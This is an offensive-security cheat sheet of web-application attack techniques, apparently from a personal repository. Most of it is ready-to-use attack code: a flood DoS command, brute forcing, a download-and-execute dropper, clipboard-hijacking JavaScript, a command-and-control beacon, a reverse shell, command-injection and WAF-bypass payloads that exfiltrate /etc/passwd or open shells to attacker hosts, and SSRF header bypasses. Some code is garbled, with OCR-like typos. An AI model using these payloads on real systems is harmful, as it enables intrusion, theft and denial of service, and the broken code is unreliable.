# Web Application TTPs

## HPING3 DoS

```bash
hping3 targetiP --flood --frag --spoof ip --destport # --syn
```

## Hydra Online Brute Force

```bash
hydra -1 ftp -P words -v targetiP ftp
```

## Download HTTP File and Execute

```python
#!/usr/bin/python import urllib2, os
urls = [11 1.1.1.1'',"2.2.2.2"] port = 11 80"
payload = "cb.sh"
for url in urls:
u = "http://%s:%s/%s" % (url, port, payload) try:
r = urllib2.urlopen(u)
wfile = open{"/tmp/cb.sh", "wb") wfile.write(r.read()) wfile.close ()
break
except: continue
if os.path.exists("/tmp/cb.sh"): os.system("chmod -oo /tmp/cb.sh") os. system ("/tmp/cb. sh")
```

## Hashcat

```sh
DICTIONARY ATTACK
hashcat -a 0 -m #type hash.txt
DICTIONARY + RULES ATTACK
hashcat -a 0 -m #type hash.txt
COMBINATION ATTACK
hashcat -a 1 -m #type hash.txt
MASK ATTACK
hashcat -a 3 -m #type hash.txt
HYBRID DICTIONARY + MASK
hashcat -a 6 -m #type hash.txt
HYBRID MASK + DICTIONARY
hashcat -a 7 -m #type hash.txt
dict.txt
dict.txt -r rule.txt
dict1.txt dict2.txt
?a?a?a?a?a?a
dict.txt ?a?a?a?a
?a?a?a?a dict.txt
```

## Malicious Javascript

```javascript
<script>
document.getElementById('copy').addEventListener('copy', function(e) { e.clipboardData.setData('text/plain', 'curl http://attacker-domain:8000/shell.sh | sh\n'); e.preventDefault(); });
 </script>
 ```
# Execute Fileless Scripts in Golang

```golang
package main

import (
    "io/ioutil"
    "net/http"
    "os/exec"
    "time"
)

func main() {
    for {
        url := "http://my_command_control:8080/executeThisScript" // Download your bash script
        resp, _ := http.Get(string(url))
        defer resp.Body.Close()

        shellScriptBody, _ := ioutil.ReadAll(resp.Body) // keep in memory

        cmd := exec.Command("/bin/bash", "-c", string(shellScriptBody))
        cmd.Start()                                                     // run in background

        time.Sleep(5000) // wait for the next beaconing
    }
}
```

## Golang Reverse Shell

```golang
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","127.0.0.1:1337");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;http://cmd.Run();}'>/tmp/sh.go&&go run /tmp/sh.go
```

# Web Applications

## Command Injection

Special Characters

```sh
&
;
Newline (0x0a or \n)
&&
|
||
command `
$(command )
```

Ngrok for Command Injection:

```bash
# Start listener
$ ./ngrok http 80

# Test for blind injection
Input field - > ;%20curl%20blablabla.ngrok.io

# Take it all
Input field -> ;curl%20-F%20shl=@/etc/passwd%20blablabla.ngrok.io
```

Useful Commands: Linux

```bash
whoami
ifconfig
ls
uname -a
```

Useful Commands: Windows

```powershell
whoami
ipconfig
dir
ver
```

Both Unix and Windows

```sh
ls||id; ls ||id; ls|| id; ls || id 
ls|id; ls |id; ls| id; ls | id 
ls&&id; ls &&id; ls&& id; ls && id 
ls&id; ls &id; ls& id; ls & id 
ls %0A id
```

Time Delay Commands
```bash
& ping -c 10 127.0.0.1 &
```

Redirecting Output
```bash
& whoami > /var/www/images/output.txt &
```
OOB (Out Of Band) Exploitation
```bash
& nslookup attacker-server.com &
& nslookup `whoami`.attacker-server.com &
```
WAF Bypasses
```bash
vuln=127.0.0.1 %0a wget https://evil.txt/reverse.txt -O 
/tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash <attacker-ip> <attacker-port>
vuln=echo PAYLOAD > /tmp/payload.txt; cat /tmp/payload.txt | base64 -d > /tmp/payload; chmod 744 /tmp/payload; /tmp/payload
```

XSS Cheat Sheet:

https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

SSRF Bypasses:

```sh
Base-Url: 127.0.0.1
Client-IP: 127.0.0.1
Http-Url: 127.0.0.1
Proxy-Host: 127.0.0.1
Proxy-Url: 127.0.0.1
Real-Ip: 127.0.0.1
Redirect: 127.0.0.1
Referer: 127.0.0.1
Referrer: 127.0.0.1
Refferer: 127.0.0.1
Request-Uri: 127.0.0.1
Uri: 127.0.0.1
Url: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Port: 443
X-Forwarded-Port: 4443
X-Forwarded-Port: 80
X-Forwarded-Port: 8080
X-Forwarded-Port: 8443
X-Forwarded-Scheme: http
X-Forwarded-Scheme: https
X-Forwarded-Server: 127.0.0.1
X-Forwarded: 127.0.0.1
X-Forwarder-For: 127.0.0.1
X-Host: 127.0.0.1
X-Http-Destinationurl: 127.0.0.1
X-Http-Host-Override: 127.0.0.1
X-Original-Remote-Addr: 127.0.0.1
X-Original-Url: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Proxy-Url: 127.0.0.1
X-Real-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Rewrite-Url: 127.0.0.1
X-True-IP: 127.0.0.1
```

## WayBack Machine Enumerator

Python script for enumerating Wayback Machine internet archives for potential subdomains, sites, and files; specifically potential password and robots.txt files.

```python
#!/usr/bin/env python3

import requests
import os

# Input Target
site = input("Input Target Website: ")

# Web Request
url = str("https://web.archive.org/cdx/search/cdx?url=" + site + "/*&output=text&fl=original&collapse=urlkey")
url_request = requests.get(url)

# Write to File
web_file = open("/tmp/website_enum.txt", "a")
web_file.write(url_request.text)
web_file.close()


with open("/tmp/website_enum.txt", "r") as file:
    info = file.read()
    print("\nPossible Password Files\n")
    passwords = os.system("grep password /tmp/website_enum.txt")
    print("\nRobots.txt File\n")
    robots = os.system("grep robots.txt /tmp/website_enum.txt")
    print("\nFull Data Can Be Found in /tmp/website_enum.txt\n")
```

Or use this one-liner to screenshot web pages with EyeWitness!

```python
root@RoseSecurity:~# python3 -c 'import requests; import os; url = str("https://web.archive.org/cdx/search/cdx?url=<website>/*&output=text&fl=original&collapse=urlkey"); url_request = requests.get(url); web_file = open("/tmp/website_enum.txt", "a"); web_file.write(url_request.text); web_file.close()'; eyewitness -f /tmp/website_enum.txt
```

## Golang Webserver Banner Scanner

This program reads in a file of IP addresses, outputting the server fingerprint to the terminal.

```go
package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
)

func readfile(filePath string) []string {
	// Read file
	readFile, err := os.Open(filePath)
	if err != nil {
		fmt.Println(err)
	}
	// Split lines and append to array
	fileScanner := bufio.NewScanner(readFile)
	fileScanner.Split(bufio.ScanLines)
	var fileLines []string
	for fileScanner.Scan() {
		fileLines = append(fileLines, fileScanner.Text())
	}
	readFile.Close()
	return fileLines
}
func scanIPs(ips []string) {
	// Connect to device ports
	for i := range ips {
		target := "http://" + ips[i]
		response, err := http.Get(target)
		if err != nil {
			continue
		}
		fmt.Println(ips[i], response.Header.Get("Server"))
	}
}

func main() {
	// Command line argument to parse
	filePath := os.Args[1]
	ips := readfile(filePath)
	// Goroutines
	go scanIPs(ips)
	var input string
	fmt.Scanln(&input)
}
```

## Minimal Golang WebDAV Server

```go
package main

import (
    "flag"
    "golang.org/x/net/webdav"
    "net/http"
)

func main() {
    var address string
    flag.StringVar(&address, "a", "localhost:8080", "Address to listen to.")
    flag.Parse()

    handler := &webdav.Handler{
        FileSystem: webdav.Dir("."),
        LockSystem: webdav.NewMemLS(),
    }

    http.ListenAndServe(address, handler)
}
```

## Apple Filing Protocol (AFP)

The Apple Filing Protocol (AFP), once known as AppleTalk Filing Protocol, is a specialized network protocol included within the Apple File Service (AFS). It is designed to provide file services for macOS and the classic Mac OS.

```sh
msf> use auxiliary/scanner/afp/afp_server_info
nmap -sV --script "afp-* and not dos and not brute" -p <PORT> <IP>
```

## Pre-Commit Hooks to Prevent Credential Leaks

```yaml
-   repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v3.2.0
    hooks:
    -   id: detect-aws-credentials
    -   id: detect-private-key
```

## Scanning Git History for Secrets

```sh
# Install git-secrets and build
git clone https://github.com/awslabs/git-secrets.git
cd git-secrets
make install

# Register needed plugins
git secrets -register-azure
git secrets -register-aws
git secrets — register-gcp

# Scan Git
git secrets --scan 
git secrets --scan-history 
git secrets --scan /path/to/file
```

## Truffleroasting GitHub Organizations

```bash
#!/usr/bin/env bash

# Enumerate GitHub organizations for secrets and credentials
PAT=<GitHub PAT>
ID=1
while [ $ID -lt 1000000 ]
do 
    curl -L \
    -H "Accept: application/vnd.github+json" \
    -H "Authorization: Bearer $PAT" \
    -H "X-GitHub-Api-Version: 2022-11-28" \
    -H "Per-Page: 100" \
    "https://api.github.com/organizations?per_page=100&since=$ID" | jq -r .[].login >> orgs.txt
    ID=$((ID + 10000))
done

# Read each line from orgs.txt and run trufflehog for each organization
while read -r line; do
    trufflehog github --concurrency=5 -j --org="$line" >> truffle_org.txt
done < orgs.txt
```

## Turning Nmap into a Vulnerability Scanner Using GitHub Actions

```yaml
name: Nmap GitHub Action
on:
  push:
    branches:
      - main
jobs:
  run_script_with_package:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v2
        
      - name: Install Nmap
        run: sudo apt-get update && sudo apt-get install -y nmap

      - name: Run Nmap Vulnerability Scanner
        run: |
          git clone https://github.com/scipag/vulscan scipag_vulscan
          sudo ln -s `pwd`/scipag_vulscan /usr/share/nmap/scripts/vulscan
          nmap -sV --script=vulscan/vulscan.nse rosesecurityresearch.com
```

## XSS Testing

Use this string on all input fields and identify what remains after filtering for XSS attacks:

```sh
'';!--"<XSS>=&{()}
```
